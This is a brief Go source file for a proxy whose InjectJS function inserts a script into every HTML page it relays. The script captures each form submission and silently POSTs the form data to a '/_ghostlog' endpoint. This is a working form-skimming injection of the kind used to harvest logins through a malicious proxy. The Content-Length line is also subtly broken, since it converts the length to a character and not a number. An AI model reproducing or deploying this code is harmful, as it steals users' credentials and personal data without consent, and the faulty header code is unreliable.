package proxy

import (
	"bytes"
	"io"
	"net/http"
	"strings"
)

func InjectJS(resp *http.Response) {
	if !strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
		return
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	js := `<script>
	document.addEventListener('submit', e => {
		const f = e.target;
		const data = new FormData(f);
		fetch('/_ghostlog', {
			method: 'POST',
			body: data
		});
	});
	</script>`

	modified := bytes.Replace(body, []byte("</body>"), []byte(js+"</body>"), 1)
	resp.Body = io.NopCloser(bytes.NewReader(modified))
	resp.ContentLength = int64(len(modified))
	resp.Header.Set("Content-Length", string(len(modified)))
}
